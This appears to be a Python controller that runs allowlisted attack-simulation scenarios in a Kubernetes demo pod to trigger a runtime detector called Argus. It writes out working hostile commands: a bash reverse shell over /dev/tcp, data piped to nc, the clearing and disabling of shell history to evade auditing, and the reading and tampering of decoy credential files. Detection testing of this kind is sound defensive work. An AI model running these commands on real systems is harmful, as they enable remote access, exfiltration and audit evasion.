from __future__ import annotations

import logging
import shlex
import threading
import time
from datetime import datetime, timezone
from uuid import uuid4

from kubernetes import client, config
from kubernetes.stream import stream

from .config import Settings
from .models import SCENARIO_LABELS, ScenarioResult

# Argus logs can land after exec returns; keep the scenario id long enough
# for the hosted tailer to classify Kata guest events, not host daemons.
_SCENARIO_LINGER_SECONDS = 50.0
_AUDIT_REMOTE_TIMEOUT_SECONDS = 32
_AUDIT_CONTROLLER_TIMEOUT_SECONDS = 38.0
_AUDIT_EVASION_INPUT = "\n".join(
    (
        "set -o history",
        "HISTCONTROL=",
        "HISTIGNORE=",
        "history -s argus-demo-before-clear",
        "history -w",
        "sleep 7",
        "history -c",
        "history -w",
        "sleep 7",
        "history -s argus-demo-before-disable",
        "history -w",
        "set +o history",
        "sleep 10",
        "exit",
    )
) + "\n"

logger = logging.getLogger(__name__)

ALLOWED_SCENARIOS = frozenset(
    {
        "audit-evasion",
        "discovery",
        "reverse-shell",
        "shell-history",
        "decoy-modify",
        "network-burst",
        "compute-simulation",
    }
)


class ScenarioController:
    def __init__(self, settings: Settings) -> None:
        self.settings = settings
        try:
            config.load_incluster_config()
        except config.ConfigException:
            config.load_kube_config()
        self.core = client.CoreV1Api()
        self._active_scenario: str | None = None
        self._last_scenario: str | None = None
        self._last_scenario_until: float = 0.0
        self._run_lock = threading.Lock()

    @property
    def active_scenario(self) -> str | None:
        if self._active_scenario:
            return self._active_scenario
        if self._last_scenario and time.monotonic() < self._last_scenario_until:
            return self._last_scenario
        return None

    def _workload_pod_name(self) -> str:
        pods = self.core.list_namespaced_pod(
            namespace=self.settings.namespace,
            label_selector=f"app={self.settings.workload_name}",
        ).items
        for pod in pods:
            if pod.status and pod.status.phase in {"Running", "Pending"}:
                return pod.metadata.name
        raise RuntimeError("demo workload pod not found")

    def _sink_ip(self) -> str:
        pods = self.core.list_namespaced_pod(
            namespace=self.settings.namespace,
            label_selector=f"app={self.settings.sink_name}",
        ).items
        for pod in pods:
            if pod.status and pod.status.pod_ip:
                return pod.status.pod_ip
        raise RuntimeError("scenario sink pod has no IP")

    def _exec(self, command: list[str]) -> str:
        pod_name = self._workload_pod_name()
        resp = stream(
            self.core.connect_get_namespaced_pod_exec,
            pod_name,
            self.settings.namespace,
            command=command,
            stderr=True,
            stdin=False,
            stdout=True,
            tty=False,
            _preload_content=False,
        )
        output = ""
        while resp.is_open():
            resp.update(timeout=30)
            if resp.peek_stdout():
                output += resp.read_stdout()
            if resp.peek_stderr():
                output += resp.read_stderr()
        resp.close()
        if resp.returncode not in (0, None):
            logger.warning("exec returned %s: %s", resp.returncode, output)
        return output

    def _exec_interactive(
        self,
        command: list[str],
        stdin_text: str,
        timeout_seconds: float,
    ) -> str:
        """Run a bounded command in a real Kubernetes exec PTY."""
        pod_name = self._workload_pod_name()
        resp = stream(
            self.core.connect_get_namespaced_pod_exec,
            pod_name,
            self.settings.namespace,
            command=command,
            stderr=False,
            stdin=True,
            stdout=True,
            tty=True,
            _preload_content=False,
        )
        output = ""
        returncode = None
        deadline = time.monotonic() + timeout_seconds
        try:
            if not resp.is_open():
                raise RuntimeError("interactive exec stream closed before input")
            resp.write_stdin(stdin_text)
            while resp.is_open():
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    raise RuntimeError(
                        f"interactive exec exceeded {timeout_seconds:.0f}s controller deadline"
                    )
                resp.update(timeout=min(1.0, remaining))
                if resp.peek_stdout():
                    output += resp.read_stdout()
            returncode = getattr(resp, "returncode", None)
        finally:
            resp.close()
        if returncode not in (0, None):
            logger.warning("interactive exec returned %s: %s", returncode, output)
        return output

    @staticmethod
    def _audit_evasion_execution(marker: str) -> tuple[list[str], str]:
        history_file = f"/tmp/{marker}.history"
        marked_bash = f"exec -a {shlex.quote(marker)} bash --noprofile --norc -i"
        script = (
            f"HISTFILE={shlex.quote(history_file)}; export HISTFILE; "
            "trap 'rm -f -- \"$HISTFILE\"' EXIT; "
            f"timeout -s KILL {_AUDIT_REMOTE_TIMEOUT_SECONDS} "
            f"bash -c {shlex.quote(marked_bash)}"
        )
        return ["/bin/bash", "-lc", script], _AUDIT_EVASION_INPUT

    def _wrap(self, inner: str, marker: str) -> list[str]:
        # BusyBox applets (netshoot /bin/true) dispatch on argv[0], so
        # `exec -a <name> /bin/true` fails with "applet not found".
        # Rename bash instead; Argus still sees the distinctive process names.
        # Hold the named process for a couple of seconds — Argus DMA sampling
        # misses instantaneous `bash -c ':'` (Discovery) but catches `bash -i`
        # (reverse-shell) because that one stays up.
        script = (
            f"(exec -a {marker}-start bash -c 'sleep 2'); "
            f"{inner}; "
            f"(exec -a {marker}-end bash -c 'sleep 1')"
        )
        return ["/bin/bash", "-lc", script]

    def _script_for(self, scenario_id: str, sink_ip: str, marker: str) -> list[str]:
        port = str(self.settings.sink_port)
        if scenario_id == "discovery":
            inner = (
                "(exec -a argus-gtc-discovery-uname bash -c 'uname -a; sleep 2'); "
                "(exec -a argus-gtc-discovery-id bash -c 'id; sleep 1'); "
                "(exec -a argus-gtc-discovery-ps bash -c 'ps aux | head -20; sleep 1'); "
                "(exec -a argus-gtc-discovery-decoys bash -c '"
                "echo --- decoys ---; "
                "cat /decoys/credentials.txt; "
                "cat /decoys/runbook.txt; "
                "ls -la /decoys; sleep 2')"
            )
        elif scenario_id == "reverse-shell":
            inner = (
                f"timeout -s KILL 20 bash -c \"exec -a {marker} "
                "bash --noprofile --norc -i "
                f"0<>/dev/tcp/{sink_ip}/{port} 1>&0 2>&0\" "
                "|| true"
            )
        elif scenario_id == "shell-history":
            inner = (
                "set +o history; export HISTFILE=/dev/null; "
                "history -c; history -w; echo cleared"
            )
        elif scenario_id == "decoy-modify":
            inner = (
                "echo 'tampered-by-demo' >> /decoys/credentials.txt && "
                "cat /decoys/credentials.txt"
            )
        elif scenario_id == "network-burst":
            inner = f"dd if=/dev/zero bs=1M count=5 2>/dev/null | nc -w 3 {sink_ip} {port} || true"
        elif scenario_id == "compute-simulation":
            inner = "for i in $(seq 1 5000); do echo $((i*i)) >/dev/null; done; echo compute-done"
        else:
            raise ValueError(f"unsupported scenario: {scenario_id}")
        return self._wrap(inner, marker)

    def run(self, scenario_id: str) -> ScenarioResult:
        if scenario_id not in ALLOWED_SCENARIOS:
            raise ValueError(f"scenario {scenario_id} is not allowlisted")
        with self._run_lock:
            started = datetime.now(timezone.utc).isoformat()
            marker = f"argus-gtc-{scenario_id.replace('-', '_')}-{uuid4().hex[:12]}"
            self._active_scenario = scenario_id
            try:
                sink_ip = (
                    self._sink_ip()
                    if scenario_id in {"reverse-shell", "network-burst"}
                    else ""
                )
                if scenario_id == "audit-evasion":
                    command, stdin_text = self._audit_evasion_execution(marker)
                    output = self._exec_interactive(
                        command,
                        stdin_text,
                        _AUDIT_CONTROLLER_TIMEOUT_SECONDS,
                    )
                else:
                    output = self._exec(
                        self._script_for(scenario_id, sink_ip, marker)
                    )
                return ScenarioResult(
                    scenario_id=scenario_id,
                    status="started",
                    message=output.strip()
                    or SCENARIO_LABELS.get(scenario_id, scenario_id),
                    started_at=started,
                    scenario_marker=marker,
                )
            finally:
                self._last_scenario = scenario_id
                self._last_scenario_until = (
                    time.monotonic() + _SCENARIO_LINGER_SECONDS
                )
                self._active_scenario = None
